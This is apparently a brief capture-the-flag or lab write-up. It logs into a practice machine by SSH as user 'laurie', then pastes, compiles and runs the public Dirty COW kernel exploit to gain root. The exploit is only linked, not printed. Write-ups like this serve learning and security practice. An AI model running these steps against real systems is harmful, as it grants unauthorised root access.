# writeup4

download: https://github.com/FireFart/dirtycow/blob/master/dirty.c

- Connect to ssh with `ssh laurie@192.168.64.2`

```
vi dirty.c
## past the dirtycow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```